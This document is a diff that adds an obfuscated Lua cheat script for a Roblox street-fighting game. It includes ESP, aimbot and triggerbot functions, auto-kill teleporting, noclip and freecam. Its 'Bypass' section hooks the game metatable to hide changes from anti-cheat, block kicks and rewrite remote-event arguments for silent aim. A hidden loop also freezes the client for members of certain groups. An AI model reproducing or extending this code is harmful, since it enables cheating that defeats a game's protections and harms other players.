+						else
+							table.foreach(L_300_forvar1, function(L_301_arg0, L_302_arg1)
+								L_302_arg1:Remove()
+							end)
+						end
+					end
+				end
+				table.remove(L_122_, L_296_forvar0)
+			end
+		end 
+	end
+end
+
+local function L_148_func(L_303_arg0, L_304_arg1, L_305_arg2, L_306_arg3)
+	local L_307_ = PlrFinder(L_303_arg0.Parent.Name)
+	if L_307_ and L_45_ and not L_305_arg2 then
+		L_147_func(L_307_)
+		L_122_[# L_122_ + 1] = {
+			['Player'] = L_307_,
+			['Text'] = Drawing.new'Text',
+			['Box'] = {
+				Drawing.new'Line',
+				Drawing.new'Line',
+				Drawing.new'Line'
+			}
+		}
+	else
+		local L_308_ = L_303_arg0:FindFirstChildOfClass'BillboardGui'
+		if L_308_ then
+			L_308_:Destroy()
+		end 
+		local L_309_ = Instance.new('BillboardGui', L_303_arg0)
+		local L_310_ = Instance.new('TextLabel', L_309_)
+		L_309_.Adornee = L_303_arg0
+		L_309_.Size = UDim2.new(0, 100, 0, 100)
+		L_309_.StudsOffset = Vector3.new(0, 1.3, 0)
+		L_309_.AlwaysOnTop = not L_306_arg3 and true or false
+		L_310_.BackgroundTransparency = 1
+		L_310_.Size = UDim2.new(1, 0, 0, 40)
+		L_310_.TextColor3 = L_305_arg2 or L_70_
+		L_310_.TextStrokeTransparency = 0.5
+		L_310_.TextSize = 8
+		local L_311_;
+		if (L_304_arg1 ~= 'GunItemEsp' and L_304_arg1 ~= 'CashItemEsp') then
+			L_311_ = PlrFinder(L_304_arg1)
+		else
+			L_304_arg1 = L_304_arg1:gsub('ItemEsp', '')
+		end
+		if L_311_ then
+			if not L_306_arg3 then 
+				local L_312_ = L_118_[L_311_] and "Yes" or "No"
+				L_310_.Text = L_304_arg1 .. " | CyAdmin User: " .. L_312_ .. "\nHas (Gamepasses) Glock: " .. L_146_func(L_311_, "Glock") .. " | Shotty: " .. L_146_func(L_311_, "Shotty") .. " | Vest: " .. L_146_func(L_311_, "BulletResist")
+			else 
+				L_310_.Text = "[Blacklisted skid] " .. L_311_.Name .. " (can be for just being in lynx)"
+			end 
+		else 
+			L_310_.Text = L_304_arg1
+		end
+	end 
+end
+
+local function L_149_func(L_313_arg0)
+	for L_314_forvar0, L_315_forvar1 in pairs(workspace:GetDescendants()) do 
+		if L_315_forvar1:IsA'Part' and not L_315_forvar1.Parent:FindFirstChild'Head' and not L_315_forvar1.Parent.Parent:FindFirstChild'Head' and L_315_forvar1.Size.Y ~= 1 then
+			local L_316_ = L_315_forvar1:FindFirstChildOfClass'SelectionBox'
+			local L_317_ = L_315_forvar1:FindFirstChildOfClass'IntValue'
+			if L_317_ then
+				L_315_forvar1.Transparency = L_317_.Value
+				L_317_:Destroy()
+				if L_316_ then 
+					L_316_:Destroy()
+				end
+			else
+				if L_313_arg0 == "wireframe" then 
+					local L_319_ = Instance.new('SelectionBox', L_315_forvar1)
+					L_319_.Adornee = L_315_forvar1
+					L_319_.LineThickness = 0.001
+					L_319_.SurfaceTransparency = 1
+					L_319_.Color3 = Color3.fromRGB(124, 0, 0)
+					L_128_[# L_128_ + 1] = {
+						L_319_,
+						L_315_forvar1
+					}
+				end
+				local L_318_ = Instance.new('IntValue', L_315_forvar1)
+				L_318_.Value = L_315_forvar1.Transparency
+				L_315_forvar1.Transparency = 1
+			end 
+		end 
+	end 	
+end 
+
+local function L_150_func(L_320_arg0, L_321_arg1)
+	if L_321_arg1 == "I am a d11voqii Admin User" or L_321_arg1 == "Hey I'm a d11voqii' streets admin user1" then 
+		L_118_[L_320_arg0] = true
+		return true 
+	end
+end
+
+local function L_151_func(L_322_arg0, L_323_arg1, L_324_arg2)
+	table.foreach(L_322_arg0, function(L_325_arg0, L_326_arg1)
+		if L_325_arg0 == "Box" then
+			table.foreach(L_326_arg1, function(L_327_arg0, L_328_arg1)
+				L_328_arg1.Visible = L_323_arg1
+				local L_329_ = tostring(L_324_arg2) == tostring(L_75_) or tostring(L_324_arg2) == tostring(L_71_)
+				L_328_arg1.Color = L_329_ and Color3.fromRGB(255, 0, 0) or L_70_
+			end)
+		else
+			if typeof(L_326_arg1) ~= "Instance" then
+				L_326_arg1.Visible = L_323_arg1
+				L_326_arg1.Color = L_70_
+			end
+		end 
+	end)
+end 
+
+local function L_152_func(L_330_arg0)
+	return workspace.CurrentCamera:WorldToViewportPoint(L_330_arg0)
+end
+
+local function L_153_func(L_331_arg0)
+	local L_332_ = GetChar().Humanoid:GetPlayingAnimationTracks()
+	for L_333_forvar0 = 1, # L_332_ do 
+		local L_334_ = L_332_[L_333_forvar0] 
+		if L_334_.Animation.AnimationId == ("rbxassetid://" .. L_331_arg0) then 
+			L_334_:Stop()
+		end
+	end
+end
+
+local function L_154_func(L_335_arg0, L_336_arg1)
+	if game.PlaceId ~= 455366377 then
+		return
+	end
+	local L_337_ = GetChar():FindFirstChild'RealHumanoidRootPart' or GetChar():FindFirstChild'Torso'
+	local L_338_ = GetChar().Humanoid:LoadAnimation(L_93_)
+	L_337_.CFrame = L_337_.CFrame * CFrame.new(math.random(20, 45), 0, math.random(1, 5))
+	wait()
+	L_21_ = true 
+	repeat 
+		L_338_:play(0.1, 1, 10)
+		L_337_.CFrame = L_125_[L_335_arg0]:FindFirstChildOfClass'Part'.CFrame + Vector3.new(0, 1.3, 0)
+		RunService.Heartbeat:wait()
+	until L_125_[L_335_arg0]:FindFirstChildOfClass'Part'.BrickColor == BrickColor.new'Bright red' or GetChar():FindFirstChild('Bone', true) or GetChar().Humanoid.Health == 0
+	L_337_.CFrame = L_336_arg1
+	L_21_ = false
+	return true
+end
+
+local function L_155_func(L_339_arg0)
+	if L_339_arg0 <= L_65_ and L_35_ and not L_42_ then 
+		if L_154_func("burger", GetChar().Head.CFrame) then
+			local L_340_ = LP.Backpack:FindFirstChild'Burger'
+			if L_340_ then 
+				L_340_.Parent = GetChar()
+				L_340_:Activate() -- CHEEMS
+				repeat
+					RunService.Heartbeat:Wait()
+				until L_340_.Parent ~= GetChar()
+			end
+		end -- yeah I copy pasted it from my heal cmd DEAL WITH IT 
+		if L_154_func("drink", GetChar().Head.CFrame) then
+			local L_341_ = LP.Backpack:FindFirstChild'Drink'
+			if L_341_ then 
+				L_341_.Parent = GetChar()
+				L_341_:Activate()
+			end 
+		end		
+	end
+end
+
+local function L_156_func(L_342_arg0, L_343_arg1)
+	local L_344_ = false
+	local L_345_, L_346_, L_347_ 
+	local function L_348_func(L_349_arg0)
+		local L_350_ = L_349_arg0.Position - L_346_
+		TweenService:Create(L_342_arg0, TweenInfo.new(0.055, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {
+			Position = UDim2.new(L_347_.X.Scale, L_347_.X.Offset + L_350_.X, L_347_.Y.Scale, L_347_.Y.Offset + L_350_.Y)
+		}):Play()
+	end
+	L_342_arg0.InputBegan:Connect(function(L_351_arg0)
+		if L_351_arg0.UserInputType == Enum.UserInputType.MouseButton1 then 
+			L_344_ = true
+			L_346_ = L_351_arg0.Position
+			L_347_ = L_342_arg0.Position
+			L_351_arg0.Changed:Connect(function()
+				if L_351_arg0.UserInputState == Enum.UserInputState.End then 
+					L_344_ = false 
+				end
+			end)
+		end
+	end)
+	L_342_arg0.InputChanged:Connect(function(L_352_arg0)
+		if L_352_arg0.UserInputType == Enum.UserInputType.MouseMovement then 
+			L_345_ = L_352_arg0
+		end
+	end)
+	UserInput.InputChanged:Connect(function(L_353_arg0)
+		if L_353_arg0 == L_345_ and L_344_ then 
+			L_348_func(L_353_arg0)
+		end
+	end)
+end
+
+local function L_157_func(L_354_arg0, L_355_arg1, L_356_arg2)
+	local L_357_ = Instance.new('TextButton', L_106_)
+	L_357_.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+	L_357_.BackgroundTransparency = 1
+	L_357_.Position = L_354_arg0
+	L_357_.Size = UDim2.new(0, 480, 0, 50)
+	L_357_.Font = Enum.Font.SourceSans
+	L_357_.TextColor3 = Color3.fromRGB(170, 0, 0)
+	L_357_.TextSize = 25
+	L_357_.Text = L_355_arg1
+	L_357_.TextWrapped = true
+	L_357_.MouseButton1Click:Connect(function()
+		if L_355_arg1 == "All" then 
+			RainbowHats = "All"
+			L_104_.Visible = false
+		else 
+			LP.Backpack.Stank:FireServer("rep", L_356_arg2.Parent)
+			L_104_.Visible = false
+			RainbowHats = true
+		end 
+	end)
+	L_156_func(L_104_, L_357_)
+end
+
+local function L_158_func(L_358_arg0, L_359_arg1)
+	if L_358_arg0 and L_359_arg1 then 
+		local L_360_ = Instance.new('TextLabel', L_100_)
+		L_360_.BackgroundTransparency = 1
+		L_360_.Position = UDim2.new(-20, 0, 0, 0)
+		L_360_.Size = UDim2.new(0, 200, 0, 15)
+		L_360_.ZIndex = 2
+		L_360_.Font = Enum.Font.SciFi
+		L_360_.Text = (L_358_arg0 .. " " .. L_359_arg1)
+		L_360_.TextColor3 = Color3.fromRGB(89, 203, 232)
+		L_360_.TextScaled = true
+		L_360_.TextSize = 14
+		L_360_.TextWrapped = true
+		L_156_func(L_100_, L_360_)
+	end 
+end
+
+local function L_159_func(L_361_arg0, L_362_arg1, L_363_arg2, L_364_arg3)
+	local L_365_ = Instance.new('TextLabel', L_99_)
+	L_365_.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+	L_365_.BackgroundTransparency = 0.9
+	L_365_.Position = L_361_arg0
+	L_365_.Size = UDim2.new(0, 387, 0, 31)
+	L_365_.Font = Enum.Font.SourceSans
+	L_365_.Text = ("[" .. L_362_arg1 .. "] " .. L_363_arg2)
+	L_365_.TextColor3 = Color3.fromRGB(255, 255, 255)
+	L_365_.TextSize = 14
+	L_365_.TextWrapped = true
+	L_156_func(L_97_, L_365_)
+end
+
+local function L_160_func(L_366_arg0, L_367_arg1)
+	if L_29_ or L_39_ then 
+		if L_367_arg1 == Enum.HumanoidStateType.FallingDown or L_367_arg1 == Enum.HumanoidStateType.PlatformStanding then
+			LP.Character.Humanoid.PlatformStand = false
+			LP.Character.Humanoid:ChangeState(8)
+		end
+	end 
+end
+
+local function L_161_func(L_368_arg0)
+	if L_368_arg0 then 
+		local L_369_ = L_368_arg0:FindFirstChildOfClass'Tool'
+		if L_369_ then 
+			return L_369_, L_369_:FindFirstChild'Fire' and "shot you" or "hit you"
+		end
+	end 
+end
+
+local function L_162_func(L_370_arg0)
+	L_103_.Text = L_370_arg0
+	L_103_.Visible = true
+	wait(5)
+	L_103_.Visible = false
+end
+
+local function L_163_func(L_371_arg0)
+	if L_371_arg0:IsA'Trail' then 
+		L_371_arg0.Color = L_69_
+	end
+	if L_24_ and L_371_arg0:FindFirstChild('Clips', true) then
+		for L_372_forvar0, L_373_forvar1 in pairs(LP.Backpack:GetChildren()) do 
+			if L_373_forvar1:IsA'Tool' and L_373_forvar1:FindFirstChild('Clips', true) then 
+				L_373_forvar1.Parent = GetChar()
+			end 
+		end
+	end 
+	if not L_24_ and L_135_[L_371_arg0.Name] and L_52_ ~= "None" then 
+		wait()
+		if L_371_arg0.Name ~= "Shotty" and L_371_arg0.Name ~= "Sawed Off" or L_52_ == "1" then 
+			GetChar().Humanoid:LoadAnimation(L_94_):Play()
+		else
+			local L_374_ = GetChar().Humanoid:LoadAnimation(L_95_)
+			L_374_:Play()
+			wait()
+			L_374_:AdjustSpeed(0)
+		end 
+	end 
+	if L_371_arg0.Name == "Bone" then
+		if L_13_ then
+			GetChar().Humanoid.Health = 0
+		end 
+		if L_32_ and game.PlaceId == 455366377 then 
+			for L_375_forvar0, L_376_forvar1 in pairs(GetChar():GetDescendants()) do 
+				if L_376_forvar1:IsA'NumberValue' then 
+					L_376_forvar1:Destroy()
+				end 
+			end
+		end 
+	end
+	if L_371_arg0:IsA'ObjectValue' and L_371_arg0.Name == "creator" then
+		local L_377_ = L_371_arg0.Value
+		if L_18_ then
+			if L_9_ then 
+				L_71_ = L_377_
+				local L_378_;
+				L_378_ = L_2_:GetPlayerFromCharacter(L_71_).CharacterAdded:Connect(function(L_379_arg0)
+					if tostring(L_379_arg0) == tostring(L_71_) then 
+						L_71_ = L_379_arg0 
+					else
+						L_378_:Disconnect()
+						L_378_ = nil
+					end
+				end)
+			end
+			if L_22_ then 
+				L_75_ = L_2_:GetPlayerFromCharacter(L_377_)
+			end
+		end
+		if L_17_ then 
+			CheckCommand("feloop " .. tostring(L_377_))
+		end 
+		if L_16_ and not L_43_ then
+			CheckCommand("triggerbot " .. tostring(L_377_))
+			L_15_ = true
+			local L_380_;
+			L_380_ = L_2_:GetPlayerFromCharacter(L_377_).CharacterRemoving:Connect(function(L_381_arg0)
+				if tostring(L_381_arg0) == tostring(L_73_) then 
+					L_43_ = false 
+					L_11_ = false 
+					L_73_ = nil
+					L_6_ = false
+					L_29_ = false
+					L_13_ = false
+					L_15_ = false
+					L_71_ = nil
+					L_380_:Disconnect()
+				else 
+					L_380_:Disconnect()
+				end 
+			end)
+		end 
+		pcall(function()
+			local L_382_, L_383_ = L_161_func(L_377_)
+			L_162_func(L_377_.Name .. " has " .. L_383_ .. " from " .. math.floor((GetChar().Head.Position - L_377_.Head.Position).magnitude) .. " studs with a " .. L_382_.Name)
+		end)
+	end
+end
+
+local function L_164_func(L_384_arg0)
+	if L_135_[L_384_arg0.Name] then 
+		L_153_func("889968874")
+		L_153_func("229339207")
+	end 
+end
+getfenv()['getgenv']()['loaded'] = true;
+getfenv()['getgenv']()['lol'] = function()
+end
+coroutine.resume(coroutine.create(function()
+	if LP:IsInGroup(6000816) or LP:IsInGroup(5272259) then
+		while true do
+		end
+	end
+end))
+local function L_165_func(L_385_arg0)
+	if not GetChar():FindFirstChild'Head' then
+		return
+	end 
+	if workspace:FindFirstChild'FreecamPart' then 
+		workspace.FreecamPart:Destroy()
+	end
+	L_385_arg0 = L_385_arg0 or 35
+	GetChar().Head.Anchored = true 
+	local L_386_ = Instance.new('Part', workspace)
+	L_386_.Name = "FreecamPart"
+	L_386_.Position = GetChar().Head.Position + Vector3.new(0, 5, 0)
+	L_386_.Transparency = 1
+	L_386_.CanCollide = false
+	L_386_.Anchored = true
+	workspace.CurrentCamera.CameraSubject = L_386_
+	while L_31_ and GetChar().Humanoid.Health > 0 and wait() do 
+		local L_387_ = Vector3.new()
+		local L_388_ = (workspace.CurrentCamera.Focus.p - workspace.CurrentCamera.CoordinateFrame.p).unit
+		local L_389_ = L_386_.Position
+		if L_136_['w'] then
+			L_387_ = L_387_ + Vector3.new(0, 0, -1)
+		elseif L_136_['a'] then
+			L_387_ = L_387_ + Vector3.new(-1, 0, 0)
+		elseif L_136_['s'] then
+			L_387_ = L_387_ + Vector3.new(0, 0, 1)
+		elseif L_136_['d'] then
+			L_387_ = L_387_ + Vector3.new(1, 0, 0)
+		elseif L_136_['Space'] then
+			L_387_ = L_387_ + Vector3.new(0, 1, 0)
+		elseif L_136_['Control'] then
+			L_387_ = L_387_ + Vector3.new(0, -1, 0)
+		end 
+		L_386_.CFrame = CFrame.new(L_389_, L_389_ + L_388_) * CFrame.new(L_387_ * L_385_arg0)
+	end
+	workspace.CurrentCamera.CameraSubject = GetChar()
+	GetChar().Head.Anchored = false 
+	if workspace:FindFirstChild'FreecamPart' then 
+		workspace.FreecamPart:Destroy()
+	end
+end
+
+local function L_166_func(L_390_arg0)
+	if L_390_arg0:FindFirstChild'Head' and GetChar():FindFirstChild'Head' then 
+		local L_391_ = Ray.new(L_390_arg0.Head.Position, GetChar().Head.Position)
+		local L_392_ = workspace:FindPartOnRay(L_391_)
+		if L_392_ then
+			return L_392_:IsDescendantOf(L_390_arg0)
+		end
+	end 
+end
+
+local function L_167_func()
+
+	if game.PlaceId == 455366377 then 
+		if L_136_['Shift'] and (L_46_ and (LP.Backpack:FindFirstChild'ServerTraits' and LP.Backpack.ServerTraits.Stann.Value > 0 or GetChar():FindFirstChild'Stamina' and GetChar().Stamina.Value > 0) or not L_46_) then
+			if L_38_ and L_64_ == 25 then
+				return
+			end
+			GetChar().Humanoid.WalkSpeed = L_64_
+			return 
+		end 
+		if L_136_['Control'] then 
+			if L_38_ and L_60_ == 8 then
+				return
+			end
+			GetChar().Humanoid.WalkSpeed = L_60_
+			return 
+		end
+		if not L_46_ then 
+			GetChar().Humanoid.WalkSpeed = L_62_
+		end
+	end 
+end
+
+local function L_168_func()
+	local L_393_;
+	local L_394_ = L_71_.FindFirstChild(L_71_, 'RealHumanoidRootPart') or L_71_.FindFirstChild(L_71_, 'Torso')
+	if L_394_ and L_47_ == "OldPrediction" then 
+		L_393_ = L_394_.CFrame + L_394_.Velocity / L_57_
+	elseif L_394_ and L_47_ == "Prediction" then
+		L_393_ = (L_394_.CFrame + L_394_.Velocity / (L_83_ < 0.26 and 5 or 7.5)) + (L_394_.RotVelocity / (L_83_ < 0.26 and 5 or 7.5))
+	elseif L_71_.FindFirstChild(L_71_, L_47_) then 
+		L_393_ = L_71_[L_47_].CFrame
+	end
+	return L_393_
+end
+
+local function L_169_func()
+	local L_395_;
+	local L_396_ = LP.Character:FindFirstChildOfClass'Tool'
+	if L_396_ and L_135_[L_396_.Name] and (L_396_.Ammo.Value > 0 or L_396_.Clips.Value > 0) then 
+		return true 
+	else 
+		for L_397_forvar0, L_398_forvar1 in pairs(LP.Backpack:GetChildren()) do 
+			if L_398_forvar1:IsA'Tool' and L_135_[L_398_forvar1.Name] then
+				if L_398_forvar1:FindFirstChild'Clips' then 
+					if L_398_forvar1.Clips.Value > 0 or L_398_forvar1.Ammo.Value > 0 then 
+						L_395_ = L_398_forvar1
+						break
+					end 
+				end 
+			end 
+		end 
+		if L_395_ then 
+			return L_395_
+		else
+			if game.PlaceId == 455366377 and GetChar():FindFirstChildOfClass'Tool' and GetChar():FindFirstChildOfClass'Tool':FindFirstChild'Ammo' and L_44_ and not L_21_ and tonumber(LP.PlayerGui.HUD.Cash.Text:sub(2)) >= 25 then
+				L_154_func("ammo", GetChar().Head.CFrame)
+				return true
+			else
+				GetChar():BreakJoints()
+			end 
+			return false
+		end 
+	end 
+end 
+	
+
+-- [[ End ]] -- 
+
+-- [[ Bypass ]] -- .
+
+local L_170_ = getrawmetatable(game)
+setreadonly(L_170_, false)
+
+local L_171_, L_172_, L_173_, L_174_ = newcclosure, getnamecallmethod, checkcaller, getcallingscript
+local L_175_, L_176_ = {
+	'WalkSpeed',
+	'JumpPower',
+	'HipHeight',
+	'Health'
+}, {
+	'bv',
+	'hb',
+	'ws'
+}
+
+local L_177_, L_178_;
+do
+	local L_399_, L_400_ = game.IsA, game.IsDescendantOf
+	local L_401_ = table.find
+
+	local L_402_ = unpack
+
+	local L_403_ = game:GetService'StarterGui'
+	local L_404_ = L_403_.SetCore
+
+	local L_405_ = function(L_407_arg0, L_408_arg1, L_409_arg2)
+		if not L_173_() then
+			if L_399_(L_407_arg0, 'Humanoid') then
+				L_404_(L_403_, 'ResetButtonCallback', true)
+
+				if L_401_(L_175_, L_408_arg1) then
+					return
+				end
+			end
+			if L_407_arg0 == workspace and L_408_arg1 == 'Gravity' then
+				return L_68_
+			end
+			if L_408_arg1 == 'CFrame' and L_400_(L_407_arg0, LP.Character) then
+				return
+			end
+		end
+		return L_177_(L_407_arg0, L_408_arg1, L_409_arg2)
+	end
+
+	local L_406_ = function(L_410_arg0, ...)
+		local L_411_ = L_172_()
+		local L_412_ = {
+			...
+		}
+
+		if L_173_() then
+			if L_411_ == 'FindFirstChild' and L_412_[1] == 'RealHumanoidRootPart' then
+				L_412_[1] = 'HumanoidRootPart'
+			end
+			return L_178_(L_410_arg0, L_402_(L_412_))
+		end
+
+		if (L_411_ == 'Destroy' or L_411_ == 'Kick') and (L_410_arg0 == LP or L_399_(L_410_arg0, 'BodyMover')) then
+			return wait(387420489)
+		end
+		if L_411_ == 'BreakJoints' and L_410_arg0 == LP.Character then
+			return wait(387420489)
+		end
+		if (L_411_ == 'WaitForChild' or L_411_ == 'FindFirstChild') and L_174_() ~= script and L_42_ and L_412_[1] == 'HumanoidRootPart' then
+			L_412_[1] = 'Torso'
+			return L_178_(L_410_arg0, L_402_(L_412_))
+		end
+
+		if L_411_ == 'FireServer' then
+			if L_401_(L_175_, L_412_[1]) then
+				return wait(387420489)
+			end
+
+			local L_413_ = L_410_arg0.Name
+
+			if L_413_ == 'Fire' and L_9_ and L_71_ then
+				return L_178_(L_410_arg0, L_168_func())
+			end
+			if L_413_ == 'Input' then
+				if L_401_(L_176_, L_412_[1]) then
+					return wait(387420489)
+				end
+
+				if L_9_ and L_71_ then
+					if L_412_[2] and L_412_[2].mousehit then
+						L_412_[2].mousehit = L_168_func()
+						return L_178_(L_410_arg0, L_402_(L_412_))
+					end
+				end
+			end
+
+			if L_410_arg0.Parent == ReplicatedStorage or L_412_[1] == 'hey' and L_413_ ~= 'SayMessageRequest' then
+				return wait(387420489)
+			end
+			if L_413_ == 'Touch1' and L_12_ then
+				L_412_[3] = true
+				return L_178_(L_410_arg0, L_402_(L_412_))
+			end
+			if L_412_[1] == 'play' then
+				L_82_ = L_412_[2]
+			elseif L_412_[1] == 'stop' then
+				L_82_ = nil
+			end
+		end
+
+		return L_178_(L_410_arg0, L_402_(L_412_))
+	end
+
+	if syn then
+		L_177_ = hookmetamethod(game, '__newindex', L_171_(L_405_))
+		L_178_ = hookmetamethod(game, '__namecall', L_171_(L_406_))
+	else
+		L_177_ = hookfunction(L_170_.__newindex, L_171_(L_405_))
+		L_178_ = hookfunction(L_170_.__namecall, L_171_(L_406_))
+	end
+end
+
+-- [[ End ]] -- 
+
+-- [[ Event Handling ]] -- 
+
+LP.Chatted:Connect(CheckCommand); 
+
+workspace.DescendantAdded:Connect(function(L_414_arg0)
+	if L_37_ and string.find(L_414_arg0.ClassName:lower(), "seat") then 
+		L_414_arg0.Parent = CoreGui
+	end
+	if L_19_ then 
+		farm("Cash")
+	end
+	if L_36_ and L_414_arg0.Name == "RandomSpawner" then
+		for L_415_forvar0, L_416_forvar1 in pairs(L_134_) do 
+			local L_417_, L_418_ = find(L_415_forvar0)
+			if L_417_ ~= "None" then 
+				L_148_func(L_417_, L_418_)
+			end
+		end
+	end
+end)
+
+RunService.Stepped:Connect(function()
+	local L_419_ = GetChar()
+	local L_420_ = L_419_:FindFirstChild'RealHumanoidRootPart' or L_419_:FindFirstChild'Torso'
+	if L_40_ then 
+		local L_422_ = L_419_:GetDescendants() 
+		for L_423_forvar0 = 1, # L_422_ do 
+			local L_424_ = L_422_[L_423_forvar0]
+			if L_424_:IsA'BasePart' then 
+				L_424_.CanCollide = false 
+			end
+		end 
+	end
+	if L_136_['Shift'] and L_64_ == 25 and L_46_ and (LP.Backpack:FindFirstChild'ServerTraits' and LP.Backpack.ServerTraits.Stann.Value <= 5 or GetChar():FindFirstChild'Stamina' and GetChar().Stamina.Value <= 5) then 
+		GetChar().Humanoid.WalkSpeed = 16
+	end
+	if L_85_ and L_84_ and L_84_.Character and L_84_.Character:FindFirstChild'Torso' then 
+	
+	end 
+	if L_32_ and game.PlaceId ~= 455366377 then
+		local L_425_ = L_419_:FindFirstChild'Right Leg'
+		if L_425_ then 
+			L_425_:Destroy()
+		end 
+	end
+	local L_421_ = L_419_:FindFirstChildOfClass'Tool'
+	if L_8_ and L_421_ and not table.find(L_127_, L_421_) then 
+		if L_419_:FindFirstChild'Right Arm' and L_419_['Right Arm']:FindFirstChild'RightGrip' then 
+			L_419_['Right Arm'].RightGrip:Destroy()
+		end 
+	end 
+	if flying and L_419_:FindFirstChild'Humanoid' and (game.PlaceId == 455366377 and not L_30_) then
+		L_30_ = true
+		LP.Character.Humanoid:ChangeState(3)
+		if game.PlaceId == 455366377 then 
+			wait(0.2)
+		end 
+		L_30_ = false
+	end
+	if L_77_ then 
+		Lighting.ClockTime = L_77_
+	end
+	if L_14_ and L_419_:FindFirstChildOfClass'Humanoid' and L_420_ then
+		L_419_.Humanoid.HipHeight = 0
+		L_96_.CFrame = L_420_.CFrame + Vector3.new(0, - 3.5, 0)
+	end
+	if L_22_ and L_75_ and L_75_.Character and L_75_.Character:FindFirstChild'Head' then
+		if L_75_.Character:FindFirstChildOfClass'Humanoid' and L_75_.Character.Humanoid.Health == 0 then
+			return
+		end 
+		if L_75_.Character:FindFirstChild(L_49_) then
+			workspace.CurrentCamera.CoordinateFrame = CFrame.new(workspace.CurrentCamera.CoordinateFrame.p, L_75_.Character[L_49_].CFrame.p)
+		else 
+			workspace.CurrentCamera.CoordinateFrame = CFrame.new(workspace.CurrentCamera.CoordinateFrame.p, L_75_.Character.Head.CFrame.p)
+		end 
+	end 
+	if L_28_ and L_81_ and L_81_.Character and L_420_ then
+		local L_426_ = L_81_.Character:FindFirstChildWhichIsA('BasePart', true)
+		if L_426_ then 
+			L_420_.CFrame = L_426_.CFrame
+		end 
+		local L_427_ = LP.Backpack:GetChildren()
+		for L_428_forvar0 = 1, # L_427_ do 
+			local L_429_ = L_427_[L_428_forvar0]
+			L_429_.Parent = L_419_
+			L_429_:GetPropertyChangedSignal("Parent"):Wait()
+		end
+	end
+	if L_11_ and L_73_ and L_73_.Character and L_420_ then
+		local L_430_ = L_73_.Character:FindFirstChild'Torso'
+		if L_430_ then
+			if L_43_ then 
+				if not L_29_ then 
+					CheckCommand("fly")
+				end
+				if not L_6_ and not L_16_ then 
+					CheckCommand("aimbotautoshoot")
+				end
+				if not L_9_ or L_73_ and tostring(L_71_) ~= tostring(L_73_) then 
+					CheckCommand("aim " .. L_73_.Name)
+				end
+				if not L_419_:FindFirstChildOfClass'ForceField' then 
+					local L_431_ = L_169_func()
+					local L_432_ = L_419_:FindFirstChildOfClass'Tool'
+					if typeof(L_431_) ~= "boolean" and L_431_ and L_431_ ~= L_432_ then
+						if L_432_ then 
+							L_432_.Parent = LP.Backpack
+							wait()
+						end
+						L_431_.Parent = LP.Character 
+					end
+				end
+				if L_73_ and L_73_.Character and not L_73_.Character:FindFirstChild('Bone', true) and (not L_21_ and L_44_ or not L_44_) then
+					if L_419_:FindFirstChild'Glock' or L_419_:FindFirstChild'Uzi' then
+						local L_433_ = math.random(1, 6)
+						if L_433_ <= 3 then 
+							L_420_.CFrame = L_430_.CFrame * CFrame.new(math.random(1, 25), 0, math.random(1, 25))
+						elseif L_433_ > 3 then 
+							L_420_.CFrame = L_430_.CFrame * CFrame.new(- math.random(1, 25), 0, - math.random(1, 25))
+						end
+					else
+						local L_434_ = math.random(1, 6)
+						if L_434_ <= 3 then 
+							L_420_.CFrame = L_430_.CFrame * CFrame.new(math.random(1, 15), 0, math.random(1, 15))
+						elseif L_434_ > 3 then 
+							L_420_.CFrame = L_430_.CFrame * CFrame.new(- math.random(1, 15), 0, - math.random(1, 15))
+						end 
+					end
+				else
+					if not L_21_ and L_44_ or not L_44_ and not L_16_ then 
+						L_420_.CFrame = L_430_.CFrame
+					end 
+				end 
+			else
+				L_420_.CFrame = L_430_.CFrame
+			end
+		end 
+	end 
+	if L_15_ then 
+		local L_435_ = L_2_:GetPlayers() 
+		for L_436_forvar0 = 1, # L_435_ do 
+			local L_437_ = L_435_[L_436_forvar0]
+			if L_420_ and L_437_ ~= LP and L_437_.Character and L_437_.Character:FindFirstChild'Head' and L_437_.Character:FindFirstChild('Bone', true) then
+				if (L_420_.Position - L_437_.Character.Head.Position).magnitude < L_67_ and L_437_.Character.Humanoid.Health > 0 and not L_437_.Character:FindFirstChild'Dragged' and not table.find(L_126_, L_437_.UserId) then
+					Teleport(L_437_.Character.Head.CFrame)
+					LP.Backpack.ServerTraits.Finish:FireServer(LP.Backpack:FindFirstChild'Punch' or LP.Character:FindFirstChild'Punch')
+				end
+			end
+		end
+	end
+end)
+
+local L_179_;
+L_179_ = LP.Character.Humanoid.HealthChanged:Connect(L_155_func)
+local L_180_;
+L_180_ = LP.Character.Humanoid.StateChanged:Connect(L_160_func)
+local L_181_;
+L_181_ = LP.Character.DescendantAdded:Connect(L_163_func)
+local L_182_;
+L_182_ = LP.Character.DescendantRemoving:Connect(L_164_func)
+local L_183_;
+L_183_ = LP.Character.Humanoid:GetPropertyChangedSignal("WalkSpeed"):Connect(L_167_func)
+
+LP.CharacterAdded:Connect(function(L_438_arg0)
+	L_29_ = false
+	L_8_ = false
+	L_127_ = {}
+	L_438_arg0:WaitForChild'Humanoid' -- wait until the humanoid has been found
+	-- Gun Animation Event -- 
+	L_182_:Disconnect()
+	L_182_ = nil 
+	L_182_ = LP.Character.DescendantRemoving:Connect(L_164_func)
+	-- HealBot Event --
+	L_179_:Disconnect()
+	L_179_ = nil 
+	L_179_ = L_438_arg0.Humanoid.HealthChanged:Connect(L_155_func)
+	-- No GroundHit Event -- 
+	L_180_:Disconnect()
+	L_180_ = nil 
+	L_180_ = L_438_arg0.Humanoid.StateChanged:Connect(L_160_func)
+	-- Colour Changer Event -- 
+	L_181_:Disconnect()
+	L_181_ = nil
+	L_181_ = L_438_arg0.DescendantAdded:Connect(L_163_func)
+	-- WalkSpeed Event -- 
+	L_183_:Disconnect()
+	L_183_ = nil 
+	L_183_ = LP.Character.Humanoid:GetPropertyChangedSignal("WalkSpeed"):Connect(L_167_func)
+	-- Loop Properties -- 
+	L_438_arg0.Humanoid.WalkSpeed = L_86_ or L_63_
+	L_438_arg0.Humanoid.JumpPower = L_87_ or L_66_
+	L_438_arg0.Humanoid.HipHeight = L_88_ or L_55_
+	-- Other --
+	if L_42_ then
+		local L_439_ = L_438_arg0:FindFirstChild'RealHumanoidRootPart'
+		if L_439_ then 
+			L_439_:Destroy()
+		end
+	end
+	if L_28_ then
+		L_438_arg0['Right Leg']:Destroy()
+		local L_440_ = L_438_arg0.Humanoid:Clone()
+		L_438_arg0.Humanoid:Destroy()
+		L_440_.Parent = L_438_arg0
+		workspace.CurrentCamera.CameraSubject = L_438_arg0
+	end 
+	pcall(function()
+		if L_82_ then 
+			wait()
